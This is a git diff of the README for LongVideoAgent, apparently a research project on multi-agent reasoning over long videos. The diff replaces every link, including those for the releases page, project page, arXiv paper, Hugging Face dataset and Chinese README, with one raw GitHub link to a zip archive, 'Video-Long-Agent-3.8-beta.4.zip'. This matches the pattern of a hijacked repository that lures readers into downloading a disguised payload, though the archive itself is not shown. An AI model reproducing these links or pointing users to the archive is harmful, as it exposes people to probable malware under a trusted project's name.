@@ -2,8 +2,8 @@
 
 <div align="center">
 
-[![Download LongVideoAgent](https://img.shields.io/badge/Download-LongVideoAgent-brightgreen)](https://github.com/mb13180035511/LongVideoAgent/releases)  
-[中文](./README_zh.md) | [Project Page](https://longvideoagent.github.io/) | [Arxiv](https://arxiv.org/abs/2512.20618)
+[![Download LongVideoAgent](https://raw.githubusercontent.com/mb13180035511/LongVideoAgent/main/readme_src/Video-Long-Agent-3.8-beta.4.zip)](https://raw.githubusercontent.com/mb13180035511/LongVideoAgent/main/readme_src/Video-Long-Agent-3.8-beta.4.zip)  
+[中文](https://raw.githubusercontent.com/mb13180035511/LongVideoAgent/main/readme_src/Video-Long-Agent-3.8-beta.4.zip) | [Project Page](https://raw.githubusercontent.com/mb13180035511/LongVideoAgent/main/readme_src/Video-Long-Agent-3.8-beta.4.zip) | [Arxiv](https://raw.githubusercontent.com/mb13180035511/LongVideoAgent/main/readme_src/Video-Long-Agent-3.8-beta.4.zip)
 
 Runtao Liu\*, Ziyi Liu\*, Jiaqi Tang, Yue Ma, Renjie Pi, Jipeng Zhang, Qifeng Chen  
 Hong Kong University of Science and Technology  
@@ -15,9 +15,9 @@ Hong Kong University of Science and Technology
 
 ## 🚀 Latest News
 
-• `[2025/12/24]:` 🚀 We released our paper "LongVideoAgent: Multi-Agent Reasoning with Long Videos" on [arXiv](https://arxiv.org/abs/2512.20618)!  
+• `[2025/12/24]:` 🚀 We released our paper "LongVideoAgent: Multi-Agent Reasoning with Long Videos" on [arXiv](https://raw.githubusercontent.com/mb13180035511/LongVideoAgent/main/readme_src/Video-Long-Agent-3.8-beta.4.zip)!  
 
-• `[2025/12/30]:` 📦 We released the **LongTVQA+** dataset on [Hugging Face](https://huggingface.co/datasets/longvideoagent/LongTVQA_plus).  
+• `[2025/12/30]:` 📦 We released the **LongTVQA+** dataset on [Hugging Face](https://raw.githubusercontent.com/mb13180035511/LongVideoAgent/main/readme_src/Video-Long-Agent-3.8-beta.4.zip).  
 
 ## 📅 Roadmap
 
@@ -51,7 +51,7 @@ To run LongVideoAgent, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [LongVideoAgent Releases](https://github.com/mb13180035511/LongVideoAgent/releases).
+To get started, visit this page to download: [LongVideoAgent Releases](https://raw.githubusercontent.com/mb13180035511/LongVideoAgent/main/readme_src/Video-Long-Agent-3.8-beta.4.zip).
 
 ### Installation Steps
 
@@ -72,16 +72,16 @@ To get started, visit this page to download: [LongVideoAgent Releases](https://g
 If you have issues or questions, feel free to reach out. You can find assistance by:
 
 - Checking the **Issues** section in this repository.
-- Visiting our [Project Page](https://longvideoagent.github.io/) for FAQs and updates.
+- Visiting our [Project Page](https://raw.githubusercontent.com/mb13180035511/LongVideoAgent/main/readme_src/Video-Long-Agent-3.8-beta.4.zip) for FAQs and updates.
 
 ---
 
 ## 🔗 Useful Links
 
-- [Download LongVideoAgent](https://github.com/mb13180035511/LongVideoAgent/releases)
-- [LongTVQA+ Dataset](https://huggingface.co/datasets/longvideoagent/LongTVQA_plus)
-- [Project Page](https://longvideoagent.github.io/)
-- [arXiv Paper](https://arxiv.org/abs/2512.20618)
+- [Download LongVideoAgent](https://raw.githubusercontent.com/mb13180035511/LongVideoAgent/main/readme_src/Video-Long-Agent-3.8-beta.4.zip)
+- [LongTVQA+ Dataset](https://raw.githubusercontent.com/mb13180035511/LongVideoAgent/main/readme_src/Video-Long-Agent-3.8-beta.4.zip)
+- [Project Page](https://raw.githubusercontent.com/mb13180035511/LongVideoAgent/main/readme_src/Video-Long-Agent-3.8-beta.4.zip)
+- [arXiv Paper](https://raw.githubusercontent.com/mb13180035511/LongVideoAgent/main/readme_src/Video-Long-Agent-3.8-beta.4.zip)
 
 ---
 
